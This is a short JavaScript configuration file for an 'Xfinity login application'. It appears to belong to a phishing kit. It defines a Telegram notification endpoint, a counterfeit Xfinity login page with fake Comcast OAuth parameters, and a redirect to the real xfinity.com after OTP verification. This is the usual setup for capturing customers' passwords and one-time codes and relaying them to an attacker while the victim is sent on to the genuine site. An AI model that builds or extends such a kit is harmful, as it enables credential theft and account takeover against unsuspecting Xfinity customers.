/**
 * Application Configuration
 *
 * Centralized constants and settings for the Xfinity login application.
 */
export const config = {
  api: {
    // The endpoint for the Telegram notification API.
    sendTelegramEndpoint: '/api/sendTelegram',
  },
  redirects: {
    // The static Xfinity login landing page (with OAuth-style query params).
    landingPage: '/login.html?r=comcast.net&s=oauth&continue=https%3A%2F%2Foauth.xfinity.com%2Fauthorize',
    // Where to redirect after OTP verification.
    afterOtp: 'https://www.xfinity.com',
  },
};
